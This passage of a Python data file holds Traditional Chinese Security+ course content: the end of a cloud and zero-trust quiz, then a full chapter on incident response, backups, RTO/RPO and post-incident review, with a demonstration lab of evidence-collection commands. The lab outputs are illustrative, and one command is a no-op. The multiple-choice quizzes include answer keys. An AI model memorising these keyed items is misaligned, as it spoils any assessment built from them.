         "answer": 1,
         "why": "映像各層是不可變的歷史。秘密應在執行時透過 secret 機制注入，絕不打包進映像。"},
        {"q": "零信任架構的核心原則是？",
         "options": ["把牆築得更高", "永不信任，始終驗證 — 不因為在內網就信任，每次存取都重新評估",
                     "只信任內網流量", "取消所有存取控制"],
         "answer": 1,
         "why": "零信任假設沒有可信的網路邊界，也假設已被入侵。存取決策依身分、裝置、情境、資源敏感度動態評估。"},
        {"q": "為什麼說「身分是新的邊界」？",
         "options": ["身分證比較重要", "當網路邊界消失（雲端、遠距、BYOD），身分驗證成為最關鍵的防線",
                     "IP 位址不重要了", "身分等於密碼"],
         "answer": 1,
         "why": "沒有網路城牆後，MFA、條件式存取、PAM 成為零信任的核心，因為身分是最後的關卡。"},
        {"q": "ZTNA 與傳統 VPN 的關鍵差別是？",
         "options": ["ZTNA 比較慢", "VPN 給予網路層存取（進入內網）；ZTNA 給予應用層存取（只到特定應用）並持續驗證",
                     "完全相同", "ZTNA 不需要驗證"],
         "answer": 1,
         "why": "VPN 帳號被盜 = 攻擊者進入整個內網。ZTNA 只授予特定應用的存取，且持續評估情境。"},
        {"q": "把 IAM 權限設為 AdministratorAccess「以免出錯」的主要風險是？",
         "options": ["帳單變高", "違反最小權限，一個金鑰洩漏就全盤皆輸；應用角色與最小權限並定期覆核",
                     "速度變慢", "沒有風險"],
         "answer": 1,
         "why": "過寬的雲端權限是常見破口。應使用短期角色而非長期金鑰，並用 CIEM 管理權限。"},
        {"q": "容器以 `--privileged` 模式執行的風險是？",
         "options": ["容器會變慢", "幾乎等於給予主機 root 權限，容器逃逸後可完全控制主機",
                     "無法連網", "映像會變大"],
         "answer": 1,
         "why": "privileged 移除了大部分隔離。應避免使用，並丟棄不必要的 capabilities、用非 root 執行。"},
        {"q": "零信任應該如何導入？",
         "options": ["一次全部替換所有系統", "漸進式導入，通常從最敏感的資源與最高風險的存取開始，逐步擴大",
                     "只買一個產品即可", "只需開啟 MFA"],
         "answer": 1,
         "why": "零信任是架構原則與旅程，不是單一產品。分階段導入才可行且可控。"},
    ],
    "keywords": ["雲端", "責任分擔", "IaaS", "PaaS", "SaaS", "CSPM", "IAM", "容器",
                 "Docker", "Kubernetes", "容器逃逸", "零信任", "ZTNA", "微分段",
                 "身分即邊界", "條件式存取", "最小權限"],
    "takeaway": [
        "上雲不會自動變安全，只是移動了責任分界；資料、身分、設定永遠是你的責任。",
        "容器要非 root 執行、不打包秘密、用最小基底、只複製必要檔案。",
        "零信任 = 永不信任始終驗證；身分成為新邊界，ZTNA 逐步取代 VPN。",
    ],
})

CH.append({
    "id": "s06",
    "title": "事件回應與營運持續",
    "subtitle": "IR 六階段、遏制策略、備份、BCP/DRP、事後檢討",
    "level": "企業",
    "minutes": 22,
    "summary": "被入侵不是「會不會」而是「什麼時候」。有沒有事先準備好的回應計畫，決定了損失是小插曲還是大災難。",
    "why": "事件回應就像**火災逃生演練**。火災發生時沒有人有時間讀說明書 — "
           "你只會做**平常練過的動作**。所以資安的價值不在於「絕不失火」（做不到），"
           "而在於**失火時能不能有條不紊地把損失降到最小**。",
    "sections": [
        {
            "heading": "事件回應的六個階段",
            "body": "**NIST 的事件回應生命週期（必背順序）**：\n\n"
                    "1. **準備 (Preparation)**：**最重要的階段**。"
                    "事前建立團隊、計畫、工具、聯絡窗口、演練。"
                    "**事件當下的成敗，八成取決於這裡做得夠不夠。**\n\n"
                    "2. **偵測與分析 (Detection & Analysis)**：發現事件、判斷嚴重度、"
                    "分類、確認範圍。「這是不是真的事件？影響多大？」\n\n"
                    "3. **遏制 (Containment)**：阻止擴散。分「短期」（立即隔離）"
                    "與「長期」（在保留證據的前提下穩住）。\n\n"
                    "4. **根除 (Eradication)**：移除惡意程式、關閉漏洞、"
                    "清除所有立足點（**記得攻擊者常有多個後門**）。\n\n"
                    "5. **復原 (Recovery)**：把系統恢復到正常運作，"
                    "**確認乾淨後才重新上線**，並加強監控觀察是否復發。\n\n"
                    "6. **經驗學習 (Lessons Learned)**：**事後檢討**。"
                    "「為什麼會發生？怎麼更快發現？如何避免重演？」"
                    "產出改進項目回饋到「準備」階段 — 形成循環。",
            "example": "**遏制的兩難：隔離 vs 保留證據**\n\n"
                       "發現一台伺服器被入侵，你面臨一個經典的兩難：\n\n"
                       "**立即拔網路線？**\n"
                       "- 好處：立刻停止危害與資料外洩\n"
                       "- 壞處：攻擊者可能察覺、記憶體證據可能遺失、"
                       "可能觸發惡意程式的「反制」（有些會在斷線時刪資料）\n\n"
                       "**先保留證據？**\n"
                       "- 好處：能完整了解攻擊範圍、保留法律證據\n"
                       "- 壞處：危害持續、資料可能繼續外洩\n\n"
                       "**專業做法（沒有唯一答案，但有原則）**：\n"
                       "1. **網路隔離而非關機** — 移到隔離 VLAN 或用防火牆切斷，"
                       "**保留記憶體與執行中狀態**（關機會摧毀記憶體證據）\n"
                       "2. **先快照 / 記憶體傾印再處置** — 保留現場\n"
                       "3. **依資產重要性與威脅類型決定速度** — "
                       "勒索軟體正在加密就要立刻切斷；APT 潛伏偵察則可能先觀察蒐證\n\n"
                       "**關鍵：這些決策原則要寫在事件回應計畫裡，"
                       "事發時照著做，而不是當場爭論。**",
            "note": "考點：六階段順序要背（準備→偵測分析→遏制→根除→復原→經驗學習）。"
                    "**準備是最重要的、經驗學習形成循環回饋**是常見考點。"
                    "注意「遏制」在「根除」之前 — 先止血再清創。",
        },
        {
            "heading": "事前準備：讓回應成為可能的東西",
            "body": "「準備」階段要建立的東西：\n\n"
                    "**1. 事件回應計畫 (IRP)**：\n"
                    "- 明確的**角色與責任**（誰是指揮官、誰對外發言、誰做技術）\n"
                    "- **分級標準**（什麼算 P1、什麼算 P3）\n"
                    "- **升級路徑**（什麼時候通報高層、法務、外部專家）\n"
                    "- **決策授權**（誰有權關閉生產系統、誰決定是否付贖金）\n\n"
                    "**2. 聯絡清單（且要離線保存！）**：\n"
                    "- 內部團隊、高層、法務、公關\n"
                    "- 外部：資安顧問、鑑識團隊、保險、執法機關\n"
                    "- **為什麼要離線**：如果連郵件系統都被加密了，"
                    "你的聯絡清單也在裡面就完了\n\n"
                    "**3. 工具與存取**：鑑識工具、乾淨的分析環境、"
                    "備援通訊管道（如果公司 Slack/Teams 掛了怎麼聯絡）\n\n"
                    "**4. 通報義務清單**：法規要求多久內通報誰"
                    "（台灣資安法、個資法、GDPR 各有時限）\n\n"
                    "**5. 演練 (Tabletop Exercise)**：定期模擬情境，"
                    "**在真實事件前發現計畫的漏洞**",
            "example": "**桌上演練 (Tabletop) 常暴露的真實問題**：\n\n"
                       "模擬「週五晚上勒索軟體爆發」，常會發現：\n"
                       "- 「誰有權決定關閉生產線？」→ 那個人在度假且沒有代理人\n"
                       "- 「聯絡資安顧問」→ 合約是三年前的，公司已倒閉\n"
                       "- 「從備份還原」→ 沒有人實際測試過還原，不知道要多久\n"
                       "- 「通知客戶」→ 客戶聯絡資料存在被加密的 CRM 裡\n"
                       "- 「對外發言」→ 沒有人知道該說什麼，各部門說法不一\n\n"
                       "**這些問題如果在真實事件中才發現，代價是慘重的。"
                       "在演練中發現，只是會議室裡的一個尷尬時刻。**\n\n"
                       "**這就是為什麼「準備」是六階段中最重要的一個** — "
                       "它把「臨場的混亂」換成「事前的排練」。\n\n"
                       "**一個殘酷的事實**：很多組織的第一次「事件回應」"
                       "就是它的第一次真實事件。這幾乎注定失敗。",
            "note": "**溝通紀律**：事件期間的內部溝通要假設「攻擊者可能在監聽」"
                    "（如果他們已在網路裡）。敏感討論應改用**帶外通訊**"
                    "（out-of-band，例如電話或另一個未受影響的平台）。",
        },
        {
            "heading": "備份與復原：最後的防線",
            "body": "**備份是勒索軟體的最終解答，但只有「能還原」的備份才算數。**\n\n"
                    "**3-2-1-1-0 原則（現代版）**：\n"
                    "- **3** 份資料副本\n"
                    "- **2** 種不同儲存媒體\n"
                    "- **1** 份異地\n"
                    "- **1** 份離線或不可變（air-gapped / immutable）← 對抗勒索的關鍵\n"
                    "- **0** 個還原錯誤（**定期測試還原**）\n\n"
                    "**備份的常見致命錯誤**：\n"
                    "1. **備份和正式機在同網段** → 一起被加密\n"
                    "2. **備份帳號權限過高** → 攻擊者用它刪掉所有備份\n"
                    "3. **從沒測試過還原** → 需要時才發現備份是壞的\n"
                    "4. **只備份資料不備份設定** → 資料回來了但系統要重建很久\n"
                    "5. **備份保留期太短** → 潛伏很久的攻擊，乾淨的備份已被輪替掉\n\n"
                    "**衡量指標**：\n"
                    "- **RTO（復原時間目標）**：多久要恢復運作\n"
                    "- **RPO（復原點目標）**：可以容忍丟多少資料（決定備份頻率）",
            "example": "**RTO 與 RPO 如何決定備份策略**：\n\n"
                       "```\n"
                       "系統            RTO      RPO      對應策略\n"
                       "────────────────────────────────────────────────────\n"
                       "電商交易系統    15 分鐘   1 分鐘   即時複寫 + 熱備援\n"
                       "內部 ERP        4 小時   1 小時   每小時快照 + 溫備援\n"
                       "檔案伺服器      24 小時   24 小時  每日備份\n"
                       "歸檔資料        1 週     1 週     每週備份到冷儲存\n"
                       "```\n\n"
                       "**關鍵觀念：RTO/RPO 越嚴格，成本越高。**"
                       "所以要依業務重要性分級，不是所有系統都用最高規格。\n\n"
                       "**業務衝擊分析 (BIA)** 就是在做這件事：\n"
                       "找出「哪些流程中斷會造成最大損失」，"
                       "據此決定各系統的 RTO/RPO 與資源投入。\n\n"
                       "**災難復原 (DRP) vs 業務持續 (BCP)**：\n"
                       "- **DRP**：偏技術 — 怎麼把 IT 系統救回來\n"
                       "- **BCP**：偏全面 — 在系統還沒救回來時，"
                       "**業務怎麼繼續運作**（手動流程、備援場地、替代供應商）\n\n"
                       "**BCP 涵蓋的不只 IT**：人員、場地、供應鏈、通訊、"
                       "甚至「主要辦公室不能用時去哪辦公」。",
            "note": "考點：**RTO 是時間（多久恢復）、RPO 是資料量（往回退多少）。**"
                    "備份頻率由 RPO 決定（RPO 1 小時 → 至少每小時備份）。"
                    "MTD（最大可容忍中斷時間）> RTO，否則計畫不可行。",
        },
        {
            "heading": "事後檢討：把事件變成改進",
            "body": "**事後檢討 (Post-Incident Review) 的目的不是找戰犯，是找改進。**\n\n"
                    "**無指責文化 (Blameless) 為什麼重要**：\n"
                    "- 如果檢討會變成追究責任 → 大家會隱瞞、防衛、不說實話\n"
                    "- 結果：真正的根因永遠找不到，同樣的事會再發生\n"
                    "- **系統性的失敗幾乎不是單一個人的錯**，"
                    "而是流程、工具、設計的缺口讓錯誤得以發生\n\n"
                    "**檢討要回答的問題**：\n"
                    "1. 發生了什麼？（時間軸）\n"
                    "2. 我們怎麼發現的？能更早嗎？（偵測缺口）\n"
                    "3. 回應得如何？哪裡卡住了？（流程缺口）\n"
                    "4. 根本原因是什麼？（不是「誰點了連結」，"
                    "而是「為什麼一封釣魚信能造成這麼大的損失」）\n"
                    "5. 如何避免重演？（具體、可追蹤、有負責人的改進項目）\n\n"
                    "**用「五個為什麼」挖到根因**：\n"
                    "不停在表面（「員工點了釣魚信」），"
                    "一路問下去（為什麼那封信進得來？為什麼點了會中？"
                    "為什麼一台電腦中招會擴散？為什麼沒有早點發現？）",
            "example": "**「五個為什麼」的實際應用**：\n\n"
                       "```\n"
                       "問題：勒索軟體加密了整個檔案伺服器\n"
                       "\n"
                       "為什麼？ → 因為惡意程式從一台員工電腦擴散過來\n"
                       "為什麼能擴散？ → 因為內網沒有分段，全部在同一網段\n"
                       "為什麼那台電腦會中？ → 因為員工開了釣魚信的附件並啟用巨集\n"
                       "為什麼巨集能執行？ → 因為沒有停用 Office 巨集的政策\n"
                       "為什麼那麼久才發現？ → 因為沒有 EDR，也沒有人看日誌\n"
                       "```\n\n"
                       "**看出差別了嗎？**\n"
                       "如果檢討停在第一層「員工點了釣魚信」，"
                       "改進就會是「加強員工教育」— 有用但遠遠不夠。\n\n"
                       "挖到底之後，改進項目變成一份完整清單：\n"
                       "- 網路分段（限制擴散）← 影響最大\n"
                       "- 停用巨集政策（阻斷執行）\n"
                       "- 部署 EDR（提早偵測）\n"
                       "- 建立日誌監控（提早發現）\n"
                       "- 加強釣魚演練（減少初始感染）\n"
                       "- 驗證備份可還原（確保能復原）\n\n"
                       "**同一個事件，淺層檢討給你一個改進，深層檢討給你六個。"
                       "而真正防止重演的，往往是那些更深層的結構性改進。**\n\n"
                       "**這也把整個 Security+ 路線串了起來** — "
                       "每一個改進項目，都是前面章節教過的東西。",
            "note": "產出要具體：每個改進項目要有**負責人、期限、驗收標準**，"
                    "並在下次演練中驗證。**沒有追蹤的檢討結論等於沒有檢討。**",
        },
    ],
    "diagram": """<svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="事件回應六階段循環">
<text x="340" y="24" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="700">事件回應生命週期（形成循環）</text>
<g font-size="12">
<rect x="30" y="50" width="120" height="54" rx="8" fill="#132a1e" stroke="#4ade80" stroke-width="2"/>
<text x="90" y="74" text-anchor="middle" fill="#86efac" font-weight="700">1 準備</text>
<text x="90" y="92" text-anchor="middle" fill="#64748b" font-size="10">最重要</text>
<rect x="180" y="50" width="120" height="54" rx="8" fill="#0f2233" stroke="#38bdf8"/>
<text x="240" y="74" text-anchor="middle" fill="#7dd3fc">2 偵測分析</text>
<text x="240" y="92" text-anchor="middle" fill="#64748b" font-size="10">這是真事件嗎</text>
<rect x="330" y="50" width="120" height="54" rx="8" fill="#2a1e13" stroke="#fbbf24"/>
<text x="390" y="74" text-anchor="middle" fill="#fcd34d">3 遏制</text>
<text x="390" y="92" text-anchor="middle" fill="#64748b" font-size="10">先止血</text>
<rect x="480" y="50" width="120" height="54" rx="8" fill="#2b1414" stroke="#f87171"/>
<text x="540" y="74" text-anchor="middle" fill="#fca5a5">4 根除</text>
<text x="540" y="92" text-anchor="middle" fill="#64748b" font-size="10">清除所有立足點</text>
<rect x="255" y="150" width="120" height="54" rx="8" fill="#0f2233" stroke="#38bdf8"/>
<text x="315" y="174" text-anchor="middle" fill="#7dd3fc">5 復原</text>
<text x="315" y="192" text-anchor="middle" fill="#64748b" font-size="10">確認乾淨才上線</text>
<rect x="405" y="150" width="140" height="54" rx="8" fill="#1a1832" stroke="#a78bfa"/>
<text x="475" y="174" text-anchor="middle" fill="#c4b5fd">6 經驗學習</text>
<text x="475" y="192" text-anchor="middle" fill="#64748b" font-size="10">五個為什麼</text>
</g>
<path d="M150 77 L178 77" stroke="#475569" stroke-width="1.5" marker-end="url(#a6)"/>
<path d="M300 77 L328 77" stroke="#475569" stroke-width="1.5" marker-end="url(#a6)"/>
<path d="M450 77 L478 77" stroke="#475569" stroke-width="1.5" marker-end="url(#a6)"/>
<path d="M540 104 Q540 130 375 165" stroke="#475569" stroke-width="1.5" fill="none" marker-end="url(#a6)"/>
<path d="M475 150 Q475 40 150 60" stroke="#a78bfa" stroke-width="1.5" fill="none" stroke-dasharray="4 3" marker-end="url(#a6)"/>
<text x="300" y="250" text-anchor="middle" fill="#a78bfa" font-size="12">經驗學習回饋到準備 → 每次事件都讓下一次更好</text>
<defs><marker id="a6" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L7,3 z" fill="#94a3b8"/></marker></defs>
</svg>""",
    "labs": [{
        "title": "事件回應的第一小時檢查清單",
        "goal": "把 IR 流程變成可執行的初步蒐證腳本（保留證據優先）。",
        "warn": "**真實事件中，蒐證順序：記憶體 → 網路狀態 → 磁碟。關機會摧毀記憶體證據。以下為示範。**",
        "steps": [
            {"cmd": "date -u; hostname; uptime",
             "explain": "**蒐證第一步：記錄時間與系統基本狀態**。所有後續紀錄都以此為時間基準。",
             "output": "Mon Jul 30 10:45:03 UTC 2026\nsrv-web-01\n 10:45:03 up 3 days,  4:23,  2 users,  load average: 4.21, 3.88, 2.14\n# load average 異常高（正常 <1）→ 與挖礦程式吻合"},
            {"cmd": "sudo ss -tnp state established > /evidence/connections_$(date +%s).txt; wc -l /evidence/connections_*.txt",
             "explain": "**保留網路連線快照**（記憶體中的狀態，重開機就沒了）。存到獨立位置。",
             "output": "23 /evidence/connections_1753872303.txt\n# 已保存 23 條連線紀錄作為證據"},
            {"cmd": "sudo cp /proc/*/maps /proc/*/cmdline /dev/null 2>/dev/null; ps auxww > /evidence/processes_$(date +%s).txt; echo '程序清單已保存'",
             "explain": "**保留完整程序清單**含指令列。ww 避免截斷。這是判斷攻擊範圍的關鍵證據。",
             "output": "程序清單已保存"},
            {"cmd": "echo '=== 遏制決策樹 ==='; cat <<'TREE'\n威脅類型 → 遏制動作\n─────────────────────────────\n勒索軟體正在加密  → 立即網路隔離（爭分奪秒）\nAPT 潛伏偵察      → 先蒐證觀察，再協調隔離\n資料正在外傳      → 立即阻斷該外連（出口過濾）\n挖礦程式          → 隔離 + 保留證據後清除\n共通原則：網路隔離優於關機（保留記憶體證據）\nTREE",
             "explain": "**遏制決策要事先想好**。不同威脅類型的最佳遏制動作不同，事發時照表操作。",
             "output": "=== 遏制決策樹 ===\n威脅類型 → 遏制動作\n─────────────────────────────\n勒索軟體正在加密  → 立即網路隔離（爭分奪秒）\nAPT 潛伏偵察      → 先蒐證觀察，再協調隔離\n資料正在外傳      → 立即阻斷該外連（出口過濾）\n挖礦程式          → 隔離 + 保留證據後清除\n共通原則：網路隔離優於關機（保留記憶體證據）"},
            {"cmd": "python3 -c \"\n# RTO/RPO 對照，決定復原優先序\nsystems=[('電商交易','15分','1分','即時複寫+熱備援'),('內部ERP','4時','1時','每小時快照'),('檔案伺服器','24時','24時','每日備份')]\nprint(f'{'系統':<12}{'RTO':<8}{'RPO':<8}策略')\nfor s in systems: print(f'{s[0]:<12}{s[1]:<8}{s[2]:<8}{s[3]}')\n\"",
             "explain": "復原階段依 RTO 優先序恢復系統。最關鍵的業務先救。",
             "output": "系統          RTO     RPO     策略\n電商交易      15分    1分     即時複寫+熱備援\n內部ERP       4時     1時     每小時快照\n檔案伺服器    24時    24時    每日備份"},
            {"cmd": "echo '=== 事後檢討：五個為什麼範本 ==='; printf '問題：%s\\n1 為什麼：%s\\n2 為什麼：%s\\n3 為什麼：%s\\n根因與改進：%s\\n' '伺服器被加密' '從員工電腦擴散' '內網未分段' '巨集未停用+無EDR' '網路分段/停用巨集/部署EDR/日誌監控'",
             "explain": "事後檢討用五個為什麼挖到結構性根因，產出的改進項目要有負責人與期限。",
             "output": "=== 事後檢討：五個為什麼範本 ===\n問題：伺服器被加密\n1 為什麼：從員工電腦擴散\n2 為什麼：內網未分段\n3 為什麼：巨集未停用+無EDR\n根因與改進：網路分段/停用巨集/部署EDR/日誌監控"},
        ],
    }],
    "quiz": [
        {"q": "NIST 事件回應六階段的正確順序是？",
         "options": ["偵測→準備→根除→遏制→復原→檢討", "準備→偵測分析→遏制→根除→復原→經驗學習",
                     "遏制→偵測→準備→復原→根除→檢討", "準備→遏制→偵測→根除→復原→檢討"],
         "answer": 1,
         "why": "先準備、發現後先遏制（止血）再根除（清創），最後檢討回饋到準備形成循環。"},
        {"q": "為什麼「準備」是事件回應六階段中最重要的？",
         "options": ["它花時間最長", "事件當下沒時間規劃，成敗八成取決於事前建立的計畫、團隊、工具與演練",
                     "法規要求", "它最容易做"],
         "answer": 1,
         "why": "火災時只會做演練過的動作。很多組織的第一次 IR 就是第一次真實事件，幾乎注定失敗。"},
        {"q": "遏制階段，為什麼通常「網路隔離」優於「直接關機」？",
         "options": ["關機比較慢", "關機會摧毀記憶體中的證據；網路隔離能止血同時保留現場",
                     "關機需要密碼", "網路隔離比較便宜"],
         "answer": 1,
         "why": "蒐證順序是記憶體→網路→磁碟。應移到隔離 VLAN 或切斷連線，先快照/記憶體傾印再處置。"},
        {"q": "3-2-1-1-0 備份原則中，對抗勒索軟體最關鍵的是哪個「1」和「0」？",
         "options": ["3 份副本與 2 種媒體", "1 份離線/不可變備份、0 個還原錯誤（定期測試還原）",
                     "1 份異地與 2 種媒體", "3 份副本與 0 錯誤"],
         "answer": 1,
         "why": "離線/不可變讓攻擊者刪不到；測試還原確保需要時真的能用。從不測試的備份等於沒有。"},
        {"q": "RTO 與 RPO 的差別是？",
         "options": ["完全相同", "RTO 是「多久恢復運作」（時間）；RPO 是「可容忍丟多少資料」（決定備份頻率）",
                     "RTO 是資料量，RPO 是時間", "都是指備份大小"],
         "answer": 1,
         "why": "RPO 1 小時 → 至少每小時備份。MTD（最大可容忍中斷）必須大於 RTO，否則計畫不可行。"},
        {"q": "DRP 與 BCP 的差別是？",
         "options": ["完全相同", "DRP 偏技術（把 IT 系統救回來）；BCP 更全面（系統還沒好時業務如何繼續）",
                     "DRP 針對火災，BCP 針對駭客", "BCP 只針對 IT"],
         "answer": 1,
         "why": "BCP 涵蓋人員、場地、供應鏈、通訊等，不只 IT。DRP 是 BCP 的技術子集。"},
        {"q": "為什麼事後檢討要採「無指責 (Blameless)」文化？",
         "options": ["為了讓大家開心", "指責會讓人隱瞞與防衛，真正的系統性根因永遠找不到，事件會重演",
                     "法規要求", "為了縮短會議"],
         "answer": 1,
         "why": "系統性失敗幾乎不是單一個人的錯，而是流程與設計的缺口。指責文化會摧毀學習。"},
        {"q": "用「五個為什麼」分析事件的價值是？",
         "options": ["拖延時間", "挖到結構性根因，讓改進從表面的一項（加強教育）變成完整的多項結構性措施",
                     "找出戰犯", "滿足文件要求"],
         "answer": 1,
         "why": "停在「員工點了釣魚信」只會得到「加強教育」；挖到底會發現網路分段、巨集政策、"
                "EDR、日誌監控等更有效的結構性改進。"},
        {"q": "為什麼事件回應的聯絡清單要「離線保存」？",
         "options": ["節省空間", "如果郵件或協作系統被加密/癱瘓，存在裡面的聯絡資料也會一起失去",
                     "法規要求", "離線比較快"],
         "answer": 1,
         "why": "勒索事件中連 CRM、郵件都可能被加密。聯絡清單、IRP 都應有離線副本。"},
        {"q": "事後檢討的改進項目應該具備什麼才有效？",
         "options": ["寫得越多越好", "具體、有負責人、有期限、有驗收標準，並在下次演練中驗證",
                     "由最高主管親自執行", "保密不公開"],
         "answer": 1,
         "why": "沒有追蹤的檢討結論等於沒有檢討。改進要能被驗證真的落實了。"},
    ],
    "keywords": ["事件回應", "IR", "準備", "遏制", "根除", "復原", "經驗學習",
                 "桌上演練", "備份", "3-2-1", "不可變備份", "RTO", "RPO", "MTD",
                 "BCP", "DRP", "BIA", "無指責文化", "五個為什麼", "帶外通訊"],
    "takeaway": [
        "六階段：準備→偵測分析→遏制→根除→復原→經驗學習；準備最重要，經驗學習形成循環。",
        "遏制時網路隔離優於關機以保留記憶體證據；能還原的備份才是勒索軟體的最終解。",
        "無指責的事後檢討 + 五個為什麼，能把單一事件轉化為多項結構性改進。",
    ],
})

TRACK = {
    "id": "t4-security-plus",
    "title": "資安通識",
    "code": "CompTIA Security+ SY0-701",
    "stage": 2,
    "stageName": "第二階段 · 核心",
    "color": "violet",
    "tagline": "最主流的資安入門證照，一次建立完整的資安全貌。",
    "goal": "看懂各類攻擊與惡意軟體、理解 Web 與雲端安全、掌握風險管理與治理、會做事件回應。",
    "chapters": CH,
}
